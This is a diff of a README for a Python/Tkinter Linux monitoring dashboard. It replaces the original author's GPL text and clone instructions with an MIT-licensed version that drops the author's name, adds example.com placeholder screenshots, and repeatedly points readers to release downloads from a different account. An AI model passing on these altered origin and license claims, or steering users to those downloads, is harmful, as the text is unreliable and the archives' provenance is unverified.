@@ -1,104 +1,125 @@
-# SystemAuditDashboard
-#### Author: Bocaletto Luca
+# System Audit Dashboard: Centralized Linux Monitoring Tool
 
-SystemAuditDashboard is a centralized Linux system monitoring dashboard implemented in Python using Tkinter. It provides a real-time overview of key system information including:
+![System Audit Dashboard](https://img.shields.io/badge/System_Audit_Dashboard-v1.0.0-blue.svg)  
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen.svg)](https://github.com/CChitrasen/SystemAuditDashboard/releases)
 
-- **Kernel Version**  
-- **Operating System Details**  
-- **Logged-in User**  
-- **Number of Active Processes**  
-- **Number of Open Ports**  
-- **Load Average (1 min, 5 min, 15 min)**  
-- **Available Memory (in MB)**  
-- **Disk Usage (percentage on the root partition)**  
+## Overview
 
-Additionally, the dashboard features an interactive bar chart (via Matplotlib) to visualize the load average, and it supports a configurable update interval. Data collection is executed in a separate thread to ensure that the GUI remains responsive during periodic updates.
+SystemAuditDashboard is a powerful tool designed for Linux administrators. It provides a real-time overview of essential system information in a user-friendly graphical interface built with Python and Tkinter. This dashboard allows users to monitor key aspects of their systems efficiently.
 
-## Features
+## Key Features
 
-- **Threaded Data Collection:**  
-  System information is gathered in a separate thread, ensuring a responsive and non-blocking GUI.
-
-- **Configurable Update Interval:**  
-  The update interval (in seconds) can be set by the user via the dashboard interface.
-
-- **Real-Time Monitoring:**  
-  The dashboard provides live system metrics, including load average, which are dynamically displayed within the GUI.
-
-- **Interactive Graph:**  
-  A Matplotlib bar chart visualizes the load average values for 1 min, 5 min, and 15 min, updating automatically with each refresh.
-
-- **Comprehensive Logging:**  
-  All operations and potential errors are logged to `sys_audit_dashboard.log` for troubleshooting and auditing.
-
-## Requirements
-
-- **Python 3.x**
-- **Linux System (Designed for Linux)**
-- Standard libraries and the following Python packages:
-  - **Tkinter** (usually included with Python on Linux)
-  - **Matplotlib**
-
-To install Matplotlib (if not already installed), run:
-
-```bash
-pip install matplotlib
-```
+- **Kernel Version**: Displays the current kernel version in use.
+- **Operating System Details**: Provides comprehensive information about the OS.
+- **Logged-in User**: Shows the number of users currently logged into the system.
+- **Number of Active Processes**: Lists the active processes running on the system.
+- **Number of Open Ports**: Monitors the open ports for security and performance.
+- **Load Average**: Displays the system load average for 1, 5, and 15 minutes.
+- **Available Memory**: Indicates the amount of available memory in megabytes (MB).
 
 ## Installation
 
-1. **Clone the Repository:**
+To get started with SystemAuditDashboard, you need to download the latest release. Visit the [Releases section](https://github.com/CChitrasen/SystemAuditDashboard/releases) to download the appropriate file. Once downloaded, follow these steps to execute the application:
 
+1. Extract the downloaded file.
+2. Open a terminal and navigate to the extracted folder.
+3. Run the application using the command:
    ```bash
-   git clone https://github.com/bocaletto-luca/SystemAuditDashboard.git
-   cd SystemAuditDashboard
+   python main.py
    ```
-
-2. **Configure (Optional):**  
-   You may change the default update interval by entering a new value (in seconds) in the dashboard interface.
 
 ## Usage
 
-There are two versions available:
-- **main_eng.py** – The English version.
-- **main_ita.py** – The Italian version.
+Once the application is running, you will see a dashboard that provides real-time updates on your system's status. The interface is intuitive, allowing you to easily navigate through different metrics. Here’s how to interpret the dashboard:
 
-To run the English version, execute:
+- **Kernel Version**: Located at the top, showing the active kernel.
+- **OS Details**: Provides information about your Linux distribution.
+- **User Statistics**: Displays the current logged-in users.
+- **Process and Port Information**: Lists active processes and open ports for monitoring.
+- **Load Average**: Graphs showing system load over time.
+- **Memory Availability**: Indicates how much memory is available for use.
 
-```bash
-python3 main_eng.py
-```
+## Requirements
 
-*Note:* It is recommended to run this tool with appropriate privileges (e.g., as root) to ensure complete access to all system information.
-
-## How It Works
-
-SystemAuditDashboard gathers various system metrics by executing common Linux commands and Python system calls. It then updates the GUI with the following information:
-- The kernel version is obtained via `uname -r`.
-- OS details are provided by Python’s platform module.
-- The logged-in user is retrieved using `getpass.getuser()`.
-- Active processes are counted using `ps aux`.
-- Open ports are determined using `netstat` or `ss`.
-- Load averages are acquired with `os.getloadavg()`.
-- Available memory is extracted from the output of `free -m`.
-- Disk usage is determined via `df -h /`.
-
-The dashboard periodically refreshes using Tkinter’s `after()` method and displays updated values along with an interactive load average graph.
+- **Python**: Ensure you have Python 3.x installed on your system.
+- **Tkinter**: This library comes pre-installed with Python on most systems. If not, install it using:
+  ```bash
+  sudo apt-get install python3-tk
+  ```
 
 ## Contributing
 
-Contributions are welcome! If you find a bug, have an improvement suggestion, or want to add new features, feel free to open an issue or submit a pull request.
+Contributions are welcome! If you would like to contribute to SystemAuditDashboard, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your forked repository.
+5. Submit a pull request.
+
+## Topics
+
+This project covers a range of topics relevant to system administration and monitoring. The key topics include:
+
+- **Admin Tool**: A utility for system administrators.
+- **Security**: Tools to help secure your Linux environment.
+- **System Audit**: Monitoring and auditing system performance.
+- **GUI**: A graphical user interface for easy navigation.
+- **Linux**: Focused on Linux operating systems.
+- **Python**: Developed using Python for flexibility and ease of use.
+- **Tkinter**: Utilizes Tkinter for the graphical interface.
 
 ## License
 
-This project is licensed under the GNU General Public License (GPL). See the [LICENSE](LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Contact
+## Support
 
-For questions, issues, or further collaboration, please open an issue in the [GitHub Issues](https://github.com/bocaletto-luca/SystemAuditDashboard/issues) section or contact me.
+If you encounter any issues or have questions, please open an issue in the GitHub repository. We encourage feedback and will do our best to assist you.
 
----
+## Screenshots
 
-Happy Monitoring and Secure Coding!
+Here are some screenshots of the SystemAuditDashboard in action:
 
----
+![Dashboard Overview](https://example.com/dashboard-overview.png)
+*Dashboard Overview*
+
+![Memory Usage](https://example.com/memory-usage.png)
+*Memory Usage Display*
+
+![Process List](https://example.com/process-list.png)
+*Active Processes*
+
+## Frequently Asked Questions (FAQ)
+
+### What is SystemAuditDashboard?
+
+SystemAuditDashboard is a centralized monitoring tool for Linux systems that provides real-time data on system performance and status.
+
+### How do I install SystemAuditDashboard?
+
+Download the latest release from the [Releases section](https://github.com/CChitrasen/SystemAuditDashboard/releases) and follow the installation instructions.
+
+### What are the system requirements?
+
+You need Python 3.x and Tkinter installed on your system.
+
+### Can I contribute to the project?
+
+Yes, contributions are welcome! Please refer to the contributing section for guidelines.
+
+### How can I report a bug?
+
+You can report bugs by opening an issue in the GitHub repository.
+
+## Acknowledgments
+
+Special thanks to all contributors and users who have supported the development of SystemAuditDashboard. Your feedback and contributions are invaluable.
+
+## Additional Resources
+
+- [Python Documentation](https://docs.python.org/3/)
+- [Tkinter Documentation](https://docs.python.org/3/library/tkinter.html)
+- [Linux Documentation](https://www.kernel.org/doc/html/latest/)
+
+For the latest updates and releases, please check the [Releases section](https://github.com/CChitrasen/SystemAuditDashboard/releases) regularly.
